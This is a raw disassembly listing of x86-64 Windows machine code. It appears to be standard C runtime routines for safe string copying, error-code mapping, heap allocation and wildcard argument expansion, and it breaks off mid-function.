   1400071d0:	49 ba 70 2a 57 34 48 	movabs $0xd6bc1f4834572a70,%r10
   1400071d7:	1f bc d6 
   1400071da:	49 8b c3             	mov    %r11,%rax
   1400071dd:	eb 92                	jmp    0x140007171
   1400071df:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   1400071e4:	44 8b cb             	mov    %ebx,%r9d
   1400071e7:	4c 8b c7             	mov    %rdi,%r8
   1400071ea:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400071ef:	48 8b d6             	mov    %rsi,%rdx
   1400071f2:	48 8b cd             	mov    %rbp,%rcx
   1400071f5:	e8 22 00 00 00       	call   0x14000721c
   1400071fa:	cc                   	int3
   1400071fb:	cc                   	int3
   1400071fc:	48 83 ec 38          	sub    $0x38,%rsp
   140007200:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140007206:	45 33 c9             	xor    %r9d,%r9d
   140007209:	45 33 c0             	xor    %r8d,%r8d
   14000720c:	33 d2                	xor    %edx,%edx
   14000720e:	33 c9                	xor    %ecx,%ecx
   140007210:	e8 7b fe ff ff       	call   0x140007090
   140007215:	48 83 c4 38          	add    $0x38,%rsp
   140007219:	c3                   	ret
   14000721a:	cc                   	int3
   14000721b:	cc                   	int3
   14000721c:	48 83 ec 28          	sub    $0x28,%rsp
   140007220:	b9 17 00 00 00       	mov    $0x17,%ecx
   140007225:	ff 15 45 7e 00 00    	call   *0x7e45(%rip)        # 0x14000f070
   14000722b:	85 c0                	test   %eax,%eax
   14000722d:	74 07                	je     0x140007236
   14000722f:	b9 05 00 00 00       	mov    $0x5,%ecx
   140007234:	cd 29                	int    $0x29
   140007236:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000723c:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   140007241:	41 8d 48 01          	lea    0x1(%r8),%ecx
   140007245:	e8 e2 fc ff ff       	call   0x140006f2c
   14000724a:	ff 15 d8 7e 00 00    	call   *0x7ed8(%rip)        # 0x14000f128
   140007250:	48 8b c8             	mov    %rax,%rcx
   140007253:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   140007258:	48 83 c4 28          	add    $0x28,%rsp
   14000725c:	48 ff 25 d5 7e 00 00 	rex.W jmp *0x7ed5(%rip)        # 0x14000f138
   140007263:	cc                   	int3
   140007264:	40 53                	rex push %rbx
   140007266:	48 83 ec 20          	sub    $0x20,%rsp
   14000726a:	33 db                	xor    %ebx,%ebx
   14000726c:	48 85 c9             	test   %rcx,%rcx
   14000726f:	74 0d                	je     0x14000727e
   140007271:	48 85 d2             	test   %rdx,%rdx
   140007274:	74 08                	je     0x14000727e
   140007276:	4d 85 c0             	test   %r8,%r8
   140007279:	75 1c                	jne    0x140007297
   14000727b:	66 89 19             	mov    %bx,(%rcx)
   14000727e:	e8 d1 01 00 00       	call   0x140007454
   140007283:	bb 16 00 00 00       	mov    $0x16,%ebx
   140007288:	89 18                	mov    %ebx,(%rax)
   14000728a:	e8 6d ff ff ff       	call   0x1400071fc
   14000728f:	8b c3                	mov    %ebx,%eax
   140007291:	48 83 c4 20          	add    $0x20,%rsp
   140007295:	5b                   	pop    %rbx
   140007296:	c3                   	ret
   140007297:	4c 8b c9             	mov    %rcx,%r9
   14000729a:	4c 2b c1             	sub    %rcx,%r8
   14000729d:	43 0f b7 04 08       	movzwl (%r8,%r9,1),%eax
   1400072a2:	66 41 89 01          	mov    %ax,(%r9)
   1400072a6:	4d 8d 49 02          	lea    0x2(%r9),%r9
   1400072aa:	66 85 c0             	test   %ax,%ax
   1400072ad:	74 e0                	je     0x14000728f
   1400072af:	48 83 ea 01          	sub    $0x1,%rdx
   1400072b3:	75 e8                	jne    0x14000729d
   1400072b5:	48 85 d2             	test   %rdx,%rdx
   1400072b8:	75 d5                	jne    0x14000728f
   1400072ba:	66 89 19             	mov    %bx,(%rcx)
   1400072bd:	e8 92 01 00 00       	call   0x140007454
   1400072c2:	bb 22 00 00 00       	mov    $0x22,%ebx
   1400072c7:	eb bf                	jmp    0x140007288
   1400072c9:	cc                   	int3
   1400072ca:	cc                   	int3
   1400072cb:	cc                   	int3
   1400072cc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400072d1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400072d6:	57                   	push   %rdi
   1400072d7:	48 83 ec 20          	sub    $0x20,%rsp
   1400072db:	45 33 d2             	xor    %r10d,%r10d
   1400072de:	49 8b d8             	mov    %r8,%rbx
   1400072e1:	4c 8b da             	mov    %rdx,%r11
   1400072e4:	4d 85 c9             	test   %r9,%r9
   1400072e7:	75 31                	jne    0x14000731a
   1400072e9:	48 85 c9             	test   %rcx,%rcx
   1400072ec:	75 31                	jne    0x14000731f
   1400072ee:	48 85 d2             	test   %rdx,%rdx
   1400072f1:	74 14                	je     0x140007307
   1400072f3:	e8 5c 01 00 00       	call   0x140007454
   1400072f8:	bb 16 00 00 00       	mov    $0x16,%ebx
   1400072fd:	89 18                	mov    %ebx,(%rax)
   1400072ff:	e8 f8 fe ff ff       	call   0x1400071fc
   140007304:	44 8b d3             	mov    %ebx,%r10d
   140007307:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000730c:	41 8b c2             	mov    %r10d,%eax
   14000730f:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140007314:	48 83 c4 20          	add    $0x20,%rsp
   140007318:	5f                   	pop    %rdi
   140007319:	c3                   	ret
   14000731a:	48 85 c9             	test   %rcx,%rcx
   14000731d:	74 d4                	je     0x1400072f3
   14000731f:	4d 85 db             	test   %r11,%r11
   140007322:	74 cf                	je     0x1400072f3
   140007324:	4d 85 c9             	test   %r9,%r9
   140007327:	75 06                	jne    0x14000732f
   140007329:	66 44 89 11          	mov    %r10w,(%rcx)
   14000732d:	eb d8                	jmp    0x140007307
   14000732f:	48 85 db             	test   %rbx,%rbx
   140007332:	75 06                	jne    0x14000733a
   140007334:	66 44 89 11          	mov    %r10w,(%rcx)
   140007338:	eb b9                	jmp    0x1400072f3
   14000733a:	48 2b d9             	sub    %rcx,%rbx
   14000733d:	48 8b d1             	mov    %rcx,%rdx
   140007340:	4d 8b c3             	mov    %r11,%r8
   140007343:	49 8b f9             	mov    %r9,%rdi
   140007346:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   14000734a:	75 18                	jne    0x140007364
   14000734c:	0f b7 04 13          	movzwl (%rbx,%rdx,1),%eax
   140007350:	66 89 02             	mov    %ax,(%rdx)
   140007353:	48 8d 52 02          	lea    0x2(%rdx),%rdx
   140007357:	66 85 c0             	test   %ax,%ax
   14000735a:	74 ab                	je     0x140007307
   14000735c:	49 83 e8 01          	sub    $0x1,%r8
   140007360:	75 ea                	jne    0x14000734c
   140007362:	eb 33                	jmp    0x140007397
   140007364:	0f b7 04 13          	movzwl (%rbx,%rdx,1),%eax
   140007368:	48 8b f7             	mov    %rdi,%rsi
   14000736b:	66 89 02             	mov    %ax,(%rdx)
   14000736e:	48 8d 52 02          	lea    0x2(%rdx),%rdx
   140007372:	66 85 c0             	test   %ax,%ax
   140007375:	74 90                	je     0x140007307
   140007377:	49 83 e8 01          	sub    $0x1,%r8
   14000737b:	74 06                	je     0x140007383
   14000737d:	48 83 ef 01          	sub    $0x1,%rdi
   140007381:	75 e1                	jne    0x140007364
   140007383:	4d 85 c0             	test   %r8,%r8
   140007386:	48 8d 46 ff          	lea    -0x1(%rsi),%rax
   14000738a:	48 0f 44 c6          	cmove  %rsi,%rax
   14000738e:	48 85 c0             	test   %rax,%rax
   140007391:	75 04                	jne    0x140007397
   140007393:	66 44 89 12          	mov    %r10w,(%rdx)
   140007397:	4d 85 c0             	test   %r8,%r8
   14000739a:	0f 85 67 ff ff ff    	jne    0x140007307
   1400073a0:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   1400073a4:	75 0f                	jne    0x1400073b5
   1400073a6:	66 46 89 54 59 fe    	mov    %r10w,-0x2(%rcx,%r11,2)
   1400073ac:	45 8d 50 50          	lea    0x50(%r8),%r10d
   1400073b0:	e9 52 ff ff ff       	jmp    0x140007307
   1400073b5:	66 44 89 11          	mov    %r10w,(%rcx)
   1400073b9:	e8 96 00 00 00       	call   0x140007454
   1400073be:	bb 22 00 00 00       	mov    $0x22,%ebx
   1400073c3:	e9 35 ff ff ff       	jmp    0x1400072fd
   1400073c8:	33 c0                	xor    %eax,%eax
   1400073ca:	4c 8d 0d 3f 92 00 00 	lea    0x923f(%rip),%r9        # 0x140010610
   1400073d1:	49 8b d1             	mov    %r9,%rdx
   1400073d4:	44 8d 40 08          	lea    0x8(%rax),%r8d
   1400073d8:	3b 0a                	cmp    (%rdx),%ecx
   1400073da:	74 2b                	je     0x140007407
   1400073dc:	ff c0                	inc    %eax
   1400073de:	49 03 d0             	add    %r8,%rdx
   1400073e1:	83 f8 2d             	cmp    $0x2d,%eax
   1400073e4:	72 f2                	jb     0x1400073d8
   1400073e6:	8d 41 ed             	lea    -0x13(%rcx),%eax
   1400073e9:	83 f8 11             	cmp    $0x11,%eax
   1400073ec:	77 06                	ja     0x1400073f4
   1400073ee:	b8 0d 00 00 00       	mov    $0xd,%eax
   1400073f3:	c3                   	ret
   1400073f4:	81 c1 44 ff ff ff    	add    $0xffffff44,%ecx
   1400073fa:	b8 16 00 00 00       	mov    $0x16,%eax
   1400073ff:	83 f9 0e             	cmp    $0xe,%ecx
   140007402:	41 0f 46 c0          	cmovbe %r8d,%eax
   140007406:	c3                   	ret
   140007407:	41 8b 44 c1 04       	mov    0x4(%r9,%rax,8),%eax
   14000740c:	c3                   	ret
   14000740d:	cc                   	int3
   14000740e:	cc                   	int3
   14000740f:	cc                   	int3
   140007410:	40 53                	rex push %rbx
   140007412:	48 83 ec 20          	sub    $0x20,%rsp
   140007416:	48 8b da             	mov    %rdx,%rbx
   140007419:	c6 42 38 01          	movb   $0x1,0x38(%rdx)
   14000741d:	89 4a 34             	mov    %ecx,0x34(%rdx)
   140007420:	e8 a3 ff ff ff       	call   0x1400073c8
   140007425:	89 43 2c             	mov    %eax,0x2c(%rbx)
   140007428:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   14000742c:	48 83 c4 20          	add    $0x20,%rsp
   140007430:	5b                   	pop    %rbx
   140007431:	c3                   	ret
   140007432:	cc                   	int3
   140007433:	cc                   	int3
   140007434:	48 83 ec 28          	sub    $0x28,%rsp
   140007438:	e8 4f f8 ff ff       	call   0x140006c8c
   14000743d:	48 85 c0             	test   %rax,%rax
   140007440:	75 09                	jne    0x14000744b
   140007442:	48 8d 05 6f 1c 01 00 	lea    0x11c6f(%rip),%rax        # 0x1400190b8
   140007449:	eb 04                	jmp    0x14000744f
   14000744b:	48 83 c0 24          	add    $0x24,%rax
   14000744f:	48 83 c4 28          	add    $0x28,%rsp
   140007453:	c3                   	ret
   140007454:	48 83 ec 28          	sub    $0x28,%rsp
   140007458:	e8 2f f8 ff ff       	call   0x140006c8c
   14000745d:	48 85 c0             	test   %rax,%rax
   140007460:	75 09                	jne    0x14000746b
   140007462:	48 8d 05 4b 1c 01 00 	lea    0x11c4b(%rip),%rax        # 0x1400190b4
   140007469:	eb 04                	jmp    0x14000746f
   14000746b:	48 83 c0 20          	add    $0x20,%rax
   14000746f:	48 83 c4 28          	add    $0x28,%rsp
   140007473:	c3                   	ret
   140007474:	40 53                	rex push %rbx
   140007476:	48 83 ec 20          	sub    $0x20,%rsp
   14000747a:	4c 8b c2             	mov    %rdx,%r8
   14000747d:	48 8b d9             	mov    %rcx,%rbx
   140007480:	48 85 c9             	test   %rcx,%rcx
   140007483:	74 0e                	je     0x140007493
   140007485:	33 d2                	xor    %edx,%edx
   140007487:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   14000748b:	48 f7 f3             	div    %rbx
   14000748e:	49 3b c0             	cmp    %r8,%rax
   140007491:	72 43                	jb     0x1400074d6
   140007493:	49 0f af d8          	imul   %r8,%rbx
   140007497:	b8 01 00 00 00       	mov    $0x1,%eax
   14000749c:	48 85 db             	test   %rbx,%rbx
   14000749f:	48 0f 44 d8          	cmove  %rax,%rbx
   1400074a3:	eb 15                	jmp    0x1400074ba
   1400074a5:	e8 76 ea ff ff       	call   0x140005f20
   1400074aa:	85 c0                	test   %eax,%eax
   1400074ac:	74 28                	je     0x1400074d6
   1400074ae:	48 8b cb             	mov    %rbx,%rcx
   1400074b1:	e8 52 29 00 00       	call   0x140009e08
   1400074b6:	85 c0                	test   %eax,%eax
   1400074b8:	74 1c                	je     0x1400074d6
   1400074ba:	48 8b 0d c7 32 01 00 	mov    0x132c7(%rip),%rcx        # 0x14001a788
   1400074c1:	4c 8b c3             	mov    %rbx,%r8
   1400074c4:	ba 08 00 00 00       	mov    $0x8,%edx
   1400074c9:	ff 15 31 7b 00 00    	call   *0x7b31(%rip)        # 0x14000f000
   1400074cf:	48 85 c0             	test   %rax,%rax
   1400074d2:	74 d1                	je     0x1400074a5
   1400074d4:	eb 0d                	jmp    0x1400074e3
   1400074d6:	e8 79 ff ff ff       	call   0x140007454
   1400074db:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   1400074e1:	33 c0                	xor    %eax,%eax
   1400074e3:	48 83 c4 20          	add    $0x20,%rsp
   1400074e7:	5b                   	pop    %rbx
   1400074e8:	c3                   	ret
   1400074e9:	cc                   	int3
   1400074ea:	cc                   	int3
   1400074eb:	cc                   	int3
   1400074ec:	48 85 c9             	test   %rcx,%rcx
   1400074ef:	74 36                	je     0x140007527
   1400074f1:	53                   	push   %rbx
   1400074f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400074f6:	4c 8b c1             	mov    %rcx,%r8
   1400074f9:	33 d2                	xor    %edx,%edx
   1400074fb:	48 8b 0d 86 32 01 00 	mov    0x13286(%rip),%rcx        # 0x14001a788
   140007502:	ff 15 40 7c 00 00    	call   *0x7c40(%rip)        # 0x14000f148
   140007508:	85 c0                	test   %eax,%eax
   14000750a:	75 16                	jne    0x140007522
   14000750c:	ff 15 7e 7b 00 00    	call   *0x7b7e(%rip)        # 0x14000f090
   140007512:	8b c8                	mov    %eax,%ecx
   140007514:	e8 af fe ff ff       	call   0x1400073c8
   140007519:	8b d8                	mov    %eax,%ebx
   14000751b:	e8 34 ff ff ff       	call   0x140007454
   140007520:	89 18                	mov    %ebx,(%rax)
   140007522:	48 83 c4 20          	add    $0x20,%rsp
   140007526:	5b                   	pop    %rbx
   140007527:	c3                   	ret
   140007528:	48 3b ca             	cmp    %rdx,%rcx
   14000752b:	73 04                	jae    0x140007531
   14000752d:	83 c8 ff             	or     $0xffffffff,%eax
   140007530:	c3                   	ret
   140007531:	33 c0                	xor    %eax,%eax
   140007533:	48 3b ca             	cmp    %rdx,%rcx
   140007536:	0f 97 c0             	seta   %al
   140007539:	c3                   	ret
   14000753a:	cc                   	int3
   14000753b:	cc                   	int3
   14000753c:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140007541:	55                   	push   %rbp
   140007542:	56                   	push   %rsi
   140007543:	57                   	push   %rdi
   140007544:	41 54                	push   %r12
   140007546:	41 55                	push   %r13
   140007548:	41 56                	push   %r14
   14000754a:	41 57                	push   %r15
   14000754c:	48 8d ac 24 40 fe ff 	lea    -0x1c0(%rsp),%rbp
   140007553:	ff 
   140007554:	48 81 ec c0 02 00 00 	sub    $0x2c0,%rsp
   14000755b:	48 8b 05 de 1a 01 00 	mov    0x11ade(%rip),%rax        # 0x140019040
   140007562:	48 33 c4             	xor    %rsp,%rax
   140007565:	48 89 85 b8 01 00 00 	mov    %rax,0x1b8(%rbp)
   14000756c:	45 33 e4             	xor    %r12d,%r12d
   14000756f:	48 89 54 24 50       	mov    %rdx,0x50(%rsp)
   140007574:	4c 8b f9             	mov    %rcx,%r15
   140007577:	48 85 d2             	test   %rdx,%rdx
   14000757a:	75 18                	jne    0x140007594
   14000757c:	e8 d3 fe ff ff       	call   0x140007454
   140007581:	41 8d 5c 24 16       	lea    0x16(%r12),%ebx
   140007586:	89 18                	mov    %ebx,(%rax)
   140007588:	e8 6f fc ff ff       	call   0x1400071fc
   14000758d:	8b c3                	mov    %ebx,%eax
   14000758f:	e9 58 03 00 00       	jmp    0x1400078ec
   140007594:	0f 57 c0             	xorps  %xmm0,%xmm0
   140007597:	4c 89 22             	mov    %r12,(%rdx)
   14000759a:	48 8b 01             	mov    (%rcx),%rax
   14000759d:	f3 0f 7f 44 24 30    	movdqu %xmm0,0x30(%rsp)
   1400075a3:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400075a8:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   1400075ad:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   1400075b2:	48 85 c0             	test   %rax,%rax
   1400075b5:	0f 84 09 02 00 00    	je     0x1400077c4
   1400075bb:	48 8d 95 b0 01 00 00 	lea    0x1b0(%rbp),%rdx
   1400075c2:	c7 85 b0 01 00 00 2a 	movl   $0x3f002a,0x1b0(%rbp)
   1400075c9:	00 3f 00 
   1400075cc:	48 8b c8             	mov    %rax,%rcx
   1400075cf:	66 44 89 a5 b4 01 00 	mov    %r12w,0x1b4(%rbp)
   1400075d6:	00 
   1400075d7:	48 bb 01 08 00 00 00 	movabs $0x200000000801,%rbx
   1400075de:	20 00 00 
   1400075e1:	e8 36 1c 00 00       	call   0x14000921c
   1400075e6:	4d 8b 37             	mov    (%r15),%r14
   1400075e9:	48 8b c8             	mov    %rax,%rcx
   1400075ec:	48 85 c0             	test   %rax,%rax
   1400075ef:	75 2b                	jne    0x14000761c
   1400075f1:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   1400075f6:	45 33 c0             	xor    %r8d,%r8d
   1400075f9:	33 d2                	xor    %edx,%edx
   1400075fb:	49 8b ce             	mov    %r14,%rcx
   1400075fe:	e8 29 03 00 00       	call   0x14000792c
   140007603:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140007608:	8b f0                	mov    %eax,%esi
   14000760a:	85 c0                	test   %eax,%eax
   14000760c:	0f 85 5b 01 00 00    	jne    0x14000776d
   140007612:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140007617:	e9 45 01 00 00       	jmp    0x140007761
   14000761c:	49 3b c6             	cmp    %r14,%rax
   14000761f:	74 1f                	je     0x140007640
   140007621:	0f b7 01             	movzwl (%rcx),%eax
   140007624:	66 83 e8 2f          	sub    $0x2f,%ax
   140007628:	66 83 f8 2d          	cmp    $0x2d,%ax
   14000762c:	77 09                	ja     0x140007637
   14000762e:	0f b7 c0             	movzwl %ax,%eax
   140007631:	48 0f a3 c3          	bt     %rax,%rbx
   140007635:	72 09                	jb     0x140007640
   140007637:	48 83 e9 02          	sub    $0x2,%rcx
   14000763b:	49 3b ce             	cmp    %r14,%rcx
   14000763e:	75 e1                	jne    0x140007621
   140007640:	0f b7 11             	movzwl (%rcx),%edx
   140007643:	66 83 fa 3a          	cmp    $0x3a,%dx
   140007647:	75 09                	jne    0x140007652
   140007649:	49 8d 46 02          	lea    0x2(%r14),%rax
   14000764d:	48 3b c8             	cmp    %rax,%rcx
   140007650:	75 4f                	jne    0x1400076a1
   140007652:	66 83 ea 2f          	sub    $0x2f,%dx
   140007656:	66 83 fa 2d          	cmp    $0x2d,%dx
   14000765a:	77 0b                	ja     0x140007667
   14000765c:	0f b7 c2             	movzwl %dx,%eax
   14000765f:	48 0f a3 c3          	bt     %rax,%rbx
   140007663:	b0 01                	mov    $0x1,%al
   140007665:	72 03                	jb     0x14000766a
   140007667:	41 8a c4             	mov    %r12b,%al
   14000766a:	49 2b ce             	sub    %r14,%rcx
   14000766d:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   140007672:	48 d1 f9             	sar    $1,%rcx
   140007675:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
   14000767a:	48 ff c1             	inc    %rcx
   14000767d:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140007682:	f6 d8                	neg    %al
   140007684:	4d 1b ed             	sbb    %r13,%r13
   140007687:	45 33 c9             	xor    %r9d,%r9d
   14000768a:	4c 23 e9             	and    %rcx,%r13
   14000768d:	33 d2                	xor    %edx,%edx
   14000768f:	49 8b ce             	mov    %r14,%rcx
   140007692:	ff 15 c0 7a 00 00    	call   *0x7ac0(%rip)        # 0x14000f158
   140007698:	48 8b d8             	mov    %rax,%rbx
   14000769b:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000769f:	75 2c                	jne    0x1400076cd
   1400076a1:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   1400076a6:	4d 8b c4             	mov    %r12,%r8
   1400076a9:	49 8b d4             	mov    %r12,%rdx
   1400076ac:	49 8b ce             	mov    %r14,%rcx
   1400076af:	e8 78 02 00 00       	call   0x14000792c
   1400076b4:	8b f0                	mov    %eax,%esi
   1400076b6:	85 c0                	test   %eax,%eax
   1400076b8:	0f 85 de 00 00 00    	jne    0x14000779c
   1400076be:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400076c3:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   1400076c8:	e9 94 00 00 00       	jmp    0x140007761
   1400076cd:	48 2b f7             	sub    %rdi,%rsi
   1400076d0:	48 c1 fe 03          	sar    $0x3,%rsi
   1400076d4:	4c 8b e6             	mov    %rsi,%r12
   1400076d7:	33 ff                	xor    %edi,%edi
   1400076d9:	66 83 7d 8c 2e       	cmpw   $0x2e,-0x74(%rbp)
   1400076de:	75 15                	jne    0x1400076f5
   1400076e0:	0f b7 45 8e          	movzwl -0x72(%rbp),%eax
   1400076e4:	66 85 c0             	test   %ax,%ax
   1400076e7:	74 2a                	je     0x140007713
   1400076e9:	66 83 f8 2e          	cmp    $0x2e,%ax
   1400076ed:	75 06                	jne    0x1400076f5
   1400076ef:	66 39 7d 90          	cmp    %di,-0x70(%rbp)
   1400076f3:	74 1e                	je     0x140007713
   1400076f5:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   1400076fa:	4d 8b c5             	mov    %r13,%r8
   1400076fd:	49 8b d6             	mov    %r14,%rdx
   140007700:	48 8d 4d 8c          	lea    -0x74(%rbp),%rcx
   140007704:	e8 23 02 00 00       	call   0x14000792c
   140007709:	8b f0                	mov    %eax,%esi
   14000770b:	85 c0                	test   %eax,%eax
   14000770d:	0f 85 80 00 00 00    	jne    0x140007793
   140007713:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140007718:	48 8b cb             	mov    %rbx,%rcx
   14000771b:	ff 15 3f 7a 00 00    	call   *0x7a3f(%rip)        # 0x14000f160
   140007721:	85 c0                	test   %eax,%eax
   140007723:	75 b4                	jne    0x1400076d9
   140007725:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000772a:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   14000772f:	48 8b d6             	mov    %rsi,%rdx
   140007732:	48 2b d7             	sub    %rdi,%rdx
   140007735:	48 c1 fa 03          	sar    $0x3,%rdx
   140007739:	4c 3b e2             	cmp    %rdx,%r12
   14000773c:	74 17                	je     0x140007755
   14000773e:	49 2b d4             	sub    %r12,%rdx
   140007741:	4a 8d 0c e7          	lea    (%rdi,%r12,8),%rcx
   140007745:	4c 8d 0d dc fd ff ff 	lea    -0x224(%rip),%r9        # 0x140007528
   14000774c:	44 8d 40 08          	lea    0x8(%rax),%r8d
   140007750:	e8 8b 31 00 00       	call   0x14000a8e0
   140007755:	48 8b cb             	mov    %rbx,%rcx
   140007758:	ff 15 f2 79 00 00    	call   *0x79f2(%rip)        # 0x14000f150
   14000775e:	45 33 e4             	xor    %r12d,%r12d
   140007761:	49 83 c7 08          	add    $0x8,%r15
   140007765:	49 8b 07             	mov    (%r15),%rax
   140007768:	e9 45 fe ff ff       	jmp    0x1400075b2
   14000776d:	48 8b df             	mov    %rdi,%rbx
   140007770:	48 3b 7c 24 38       	cmp    0x38(%rsp),%rdi
   140007775:	0f 84 c4 00 00 00    	je     0x14000783f
   14000777b:	48 8b 0b             	mov    (%rbx),%rcx
   14000777e:	e8 69 fd ff ff       	call   0x1400074ec
   140007783:	48 83 c3 08          	add    $0x8,%rbx
   140007787:	48 3b 5c 24 38       	cmp    0x38(%rsp),%rbx
   14000778c:	75 ed                	jne    0x14000777b
   14000778e:	e9 ac 00 00 00       	jmp    0x14000783f
   140007793:	48 8b cb             	mov    %rbx,%rcx
   140007796:	ff 15 b4 79 00 00    	call   *0x79b4(%rip)        # 0x14000f150
   14000779c:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   1400077a1:	48 8b df             	mov    %rdi,%rbx
   1400077a4:	48 3b 7c 24 38       	cmp    0x38(%rsp),%rdi
   1400077a9:	0f 84 90 00 00 00    	je     0x14000783f
   1400077af:	48 8b 0b             	mov    (%rbx),%rcx
   1400077b2:	e8 35 fd ff ff       	call   0x1400074ec
   1400077b7:	48 83 c3 08          	add    $0x8,%rbx
   1400077bb:	48 3b 5c 24 38       	cmp    0x38(%rsp),%rbx
   1400077c0:	75 ed                	jne    0x1400077af
   1400077c2:	eb 7b                	jmp    0x14000783f
   1400077c4:	4c 8b f6             	mov    %rsi,%r14
   1400077c7:	49 8b d4             	mov    %r12,%rdx
   1400077ca:	4c 2b f7             	sub    %rdi,%r14
   1400077cd:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
   1400077d2:	49 c1 fe 03          	sar    $0x3,%r14
   1400077d6:	48 8b c7             	mov    %rdi,%rax
   1400077d9:	49 ff c6             	inc    %r14
   1400077dc:	48 3b fe             	cmp    %rsi,%rdi
   1400077df:	74 25                	je     0x140007806
   1400077e1:	4c 8b 08             	mov    (%rax),%r9
   1400077e4:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   1400077e8:	48 ff c1             	inc    %rcx
   1400077eb:	66 45 39 24 49       	cmp    %r12w,(%r9,%rcx,2)
   1400077f0:	75 f6                	jne    0x1400077e8
   1400077f2:	48 ff c2             	inc    %rdx
   1400077f5:	48 83 c0 08          	add    $0x8,%rax
   1400077f9:	48 03 d1             	add    %rcx,%rdx
   1400077fc:	48 3b c6             	cmp    %rsi,%rax
   1400077ff:	75 e0                	jne    0x1400077e1
   140007801:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
   140007806:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000780c:	49 8b ce             	mov    %r14,%rcx
   14000780f:	e8 7c dd ff ff       	call   0x140005590
   140007814:	48 8b d8             	mov    %rax,%rbx
   140007817:	48 85 c0             	test   %rax,%rax
   14000781a:	75 32                	jne    0x14000784e
   14000781c:	33 c9                	xor    %ecx,%ecx
   14000781e:	e8 c9 fc ff ff       	call   0x1400074ec
   140007823:	48 8b df             	mov    %rdi,%rbx
   140007826:	48 3b fe             	cmp    %rsi,%rdi
   140007829:	74 11                	je     0x14000783c
   14000782b:	48 8b 0b             	mov    (%rbx),%rcx
   14000782e:	e8 b9 fc ff ff       	call   0x1400074ec
   140007833:	48 83 c3 08          	add    $0x8,%rbx
   140007837:	48 3b de             	cmp    %rsi,%rbx
   14000783a:	75 ef                	jne    0x14000782b
   14000783c:	83 ce ff             	or     $0xffffffff,%esi
   14000783f:	48 8b cf             	mov    %rdi,%rcx
   140007842:	e8 a5 fc ff ff       	call   0x1400074ec
   140007847:	8b c6                	mov    %esi,%eax
   140007849:	e9 9e 00 00 00       	jmp    0x1400078ec
   14000784e:	4a 8d 0c f0          	lea    (%rax,%r14,8),%rcx
   140007852:	4c 8b f7             	mov    %rdi,%r14
   140007855:	48 89 8d b0 01 00 00 	mov    %rcx,0x1b0(%rbp)
   14000785c:	4c 8b e1             	mov    %rcx,%r12
   14000785f:	48 3b fe             	cmp    %rsi,%rdi
   140007862:	74 56                	je     0x1400078ba
   140007864:	4c 8b eb             	mov    %rbx,%r13
   140007867:	4c 2b ef             	sub    %rdi,%r13
   14000786a:	4d 8b 06             	mov    (%r14),%r8
   14000786d:	49 83 cf ff          	or     $0xffffffffffffffff,%r15
   140007871:	33 c0                	xor    %eax,%eax
   140007873:	49 ff c7             	inc    %r15
   140007876:	66 43 39 04 78       	cmp    %ax,(%r8,%r15,2)
   14000787b:	75 f6                	jne    0x140007873
   14000787d:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140007882:	49 8b c4             	mov    %r12,%rax
   140007885:	48 2b c1             	sub    %rcx,%rax
   140007888:	49 ff c7             	inc    %r15
   14000788b:	48 d1 f8             	sar    $1,%rax
   14000788e:	4d 8b cf             	mov    %r15,%r9
   140007891:	48 2b d0             	sub    %rax,%rdx
   140007894:	49 8b cc             	mov    %r12,%rcx
   140007897:	e8 30 fa ff ff       	call   0x1400072cc
   14000789c:	33 c9                	xor    %ecx,%ecx
   14000789e:	85 c0                	test   %eax,%eax
   1400078a0:	75 74                	jne    0x140007916
   1400078a2:	48 8b 8d b0 01 00 00 	mov    0x1b0(%rbp),%rcx
   1400078a9:	4f 89 24 2e          	mov    %r12,(%r14,%r13,1)
   1400078ad:	49 83 c6 08          	add    $0x8,%r14
   1400078b1:	4f 8d 24 7c          	lea    (%r12,%r15,2),%r12
   1400078b5:	4c 3b f6             	cmp    %rsi,%r14
   1400078b8:	75 b0                	jne    0x14000786a
   1400078ba:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400078bf:	33 c9                	xor    %ecx,%ecx
   1400078c1:	48 89 18             	mov    %rbx,(%rax)
   1400078c4:	e8 23 fc ff ff       	call   0x1400074ec
   1400078c9:	48 8b df             	mov    %rdi,%rbx
   1400078cc:	48 3b fe             	cmp    %rsi,%rdi
   1400078cf:	74 11                	je     0x1400078e2
   1400078d1:	48 8b 0b             	mov    (%rbx),%rcx
